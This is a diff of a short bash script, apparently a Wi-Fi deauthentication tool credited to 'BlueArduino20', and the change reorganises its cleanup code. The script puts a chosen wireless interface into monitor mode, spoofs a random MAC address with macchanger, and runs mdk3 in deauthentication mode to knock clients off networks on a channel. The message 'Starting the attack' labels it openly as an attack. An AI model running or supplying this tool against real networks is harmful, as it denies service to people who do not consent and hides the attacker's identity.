@@ -1,16 +1,3 @@
-function coolexit()
-{
-clear
-ifconfig $WI down
-macchanger -p $WI
-iwconfig $WI mode managed
-ifconfig $WI up
-clear
-echo -e "\e[1;31mThanks for using this script"
-echo -e "Made by BlueArduino20"
-exit
-}
-
 echo -e "\e[1;31m    ____                ____                   __  __             "
 echo -e "   / __ \\_      _______/ __ \\___  ____ ___  __/ /_/ /_  ___  _____"
 echo -e "  / /_/ / | /| / / ___/ / / / _ \\/ __ \`/ / / / __/ __ \\/ _ \\/ ___/"
@@ -27,10 +14,18 @@ clear
 ifconfig
 echo -n -e "Choose your wireless interface: "
 read WI
-echo -e "\e[1;31mStarting the attack... If you want to stop it, close the new window."
+echo -e "\e[1;31mStarting the attack... If you want to stop it press CTRL+C"
 ifconfig $WI down
 iwconfig $WI mode monitor
 macchanger -r $WI
 ifconfig $WI up
 mdk3 $WI d -c $CH
-trap exit EXIT
+clear
+ifconfig $WI down
+macchanger -p $WI
+iwconfig $WI mode managed
+ifconfig $WI up
+clear
+echo -e "\e[1;31mThanks for using this script"
+echo -e "Made by BlueArduino20"
+exit
